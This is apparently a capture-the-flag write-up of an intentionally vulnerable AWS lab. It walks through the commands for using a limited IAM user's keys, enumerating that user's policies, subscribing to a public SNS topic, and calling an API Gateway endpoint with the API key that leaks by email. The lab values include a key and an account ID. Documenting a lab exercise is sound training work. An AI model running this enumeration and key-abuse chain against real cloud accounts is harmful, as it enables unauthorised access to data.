To find the flag, I’ve taken the following steps:

Step 1: Deploy the environment

I started by deploying the vulnerable cloud environment using Terraform.
- terraform init
- terraform plan
- terraform apply

After `terraform apply`, the output provided scenario details and confirmed that:
- A limited IAM user was created
- An SNS topic was available
- Terraform outputs indicated that an API Gateway and API key were part of the scenario (marked as sensitive)
- The goal was to extract the flag from a protected API Gateway

Step 2: Retrieve IAM Credentials

Terraform output provided credentials for the limited IAM user.

Commands executed:
- terraform output sns_user_access_key_id
- terraform output -raw sns_user_secret_access_key

I then configured these credentials locally as a new AWS CLI profile.
- aws configure --profile sns-secrets

Step 3: Verify the Active AWS Identity

I verified that the AWS CLI was using the challenge credentials
- aws sts get-caller-identity --profile sns-secrets

The output confirmed that I was authenticated as the limited IAM user.

Step 4: Enumerate IAM Permissions

Next, I enumerated the permissions assigned to the IAM user.

Commands executed:
- aws iam list-user-policies \
--user-name cg-sns-user-cgidssgni09u \
--profile sns-secrets
- aws iam get-user-policy \
--user-name cg-sns-user-cgidssgni09u \
--policy-name cg-sns-user-policy-cgidssgni09u \
--profile sns-secrets

From the policy review, I identified permissions related to SNS, which became the next attack path.

Step 5: Discover Available SNS Topics

I searched for accessible SNS topics.
- aws sns list-topics --profile sns-secrets

Step 6: Subscribe to the SNS Topic

Since SNS allowed public subscription, I subscribed using my email address.
- aws sns subscribe \
--topic-arn arn:aws:sns:us-east-1:306989527055:public-topic-cgidssgni09u \
--protocol email \
--notification-endpoint your-email@example.com \
--profile sns-secrets

Step 7: Receive Leaked API Key

After confirming the subscription, I received an email containing:
- API Gateway endpoint URL
- API Key

This demonstrated sensitive information leakage via SNS.

Step 8: Call the Protected API

Using the leaked API key from the email, I successfully called the protected API.
- Invoke-WebRequest -Uri "https://sd6uexhdr1.execute-api.us-east-1.amazonaws.com/prod-cgidssgni09u/user-data" -Headers @{"x-api-key"="5zbaoam3a20tt034n8ou0xw00jenvywf"}

The API response returned sensitive data along with the flag.
